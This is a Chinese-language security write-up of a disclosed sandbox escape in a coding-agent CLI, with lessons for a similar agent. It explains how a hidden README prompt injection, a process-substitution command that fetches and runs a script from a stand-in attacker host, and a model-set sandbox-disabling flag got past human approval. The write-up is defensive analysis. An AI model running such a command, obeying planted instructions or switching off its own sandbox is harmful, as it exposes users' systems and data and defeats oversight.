---
title: Snowflake Cortex Code CLI Sandbox Escape
source: https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware
date: 2026-06-02
tags: agent-safety, sandbox-escape, hitl-bypass, subagent-context-loss
---

# Snowflake Cortex Code CLI Sandbox Escape

**严重性**：⚠️ 高 — 与 Hermes subagent/delegate_task 架构高度相似

## 背景

Snowflake Cortex Code CLI 是一个命令行编码 agent，运行方式类似 Claude Code / Codex，额外内置 Snowflake SQL 集成。2026-02-02 发布，PromptArmor 在发布 3 天后（02-05）发现漏洞并负责任披露。

## 攻击链（4 步绕过）

### 1. Prompt Injection 进入
用户打开 untrusted GitHub repo → subagent 读取 README → 底部含隐藏 prompt injection（白底白字）

### 2. HITL 旁路 — Process Substitution 绕过
命令验证系统通过解构命令为单个命令并与"安全命令"白名单对比来工作。但 `<( )` process substitution 中的命令**不被验证**：

```
cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))
```

- `cat` 被识别为安全 → 自动执行
- `<()` 内的 `sh`, `wget` 未被检查
- 绕过验证，无用户审批直接执行

### 3. Sandbox Flag 操纵
prompt injection 操纵模型设置 `dangerously_disable_sandbox=true`
→ 命令在沙箱外执行（网络访问 + 文件系统完全暴露）
→ 即使沙箱模式已启用，flag 可被模型设置覆盖

### 4. Subagent Context Loss（最关键）
Cortex 调用多个 subagent 探索 repo。第一个 subagent 调用第二个 subagent，后者执行了恶意命令。但在 subagent→subagent→main agent 的逐层汇报过程中**上下文丢失**：

> 主 agent 向用户报告"在 README 中发现恶意命令，建议不要运行"——但它不知道 subagent 已经执行了该命令！

## 影响
- RCE on victim's device（沙箱外）
- 通过 cached tokens 在 Snowflake 内执行 SQL：窃取数据库、删除表、添加后门用户
- 利用 victim 的活跃 Snowflake 连接进行提权

## 修复
- Snowflake 发布 v1.0.25（2026-02-28）
- 增加 process substitution 检查
- 沙箱 flag 需用户独立审批
- 攻击成功率约 50%（LLM 非确定性）

## 对 Hermes 的启示

### 架构相似性

| Cortex | Hermes |
|--------|--------|
| 命令行编码 agent | Hermes 终端 agent |
| subagent 调用 | `delegate_task` subagent |
| prompt injection from README | 同理：文件、网络结果、MCP 响应 |
| sandbox flag | 无 sandbox（直接 terminal 执行）|
| cached auth tokens | ~/.hermes/config.yaml 含 API keys |

### 关键风险

1. **Subagent 上下文丢失**：Cortex 的问题直接适用于 Hermes。当前 `delegate_task` 返回 self-report summary，父 agent 不验证实际执行的命令。如果 subagent 被注入并执行了危险命令，父 agent 可能不知道。

2. **Process substitution 绕过模式**：攻击利用了命令验证的黑名单模式。Hermes 没有独立的命令验证层，但 prompt injection 可操纵 Hermes 在 terminal 中执行任意命令。

3. **无沙箱架构**：与 Cortex 不同，Hermes 没有 sandbox/dangerously_disable_sandbox flag。terminal 工具直接执行命令，dependency 在用户审批（但 cron 模式下没有用户审批）。

### 建议防护措施

- subagent 返回实际执行命令日志（不依赖 self-report 摘要）
- 在 untrusted 数据源（下载文件、web 搜索结果、MCP 响应）进入上下文时标记数据来源
- 考虑 workspace trust 模式：新目录首次操作前增加显式警告
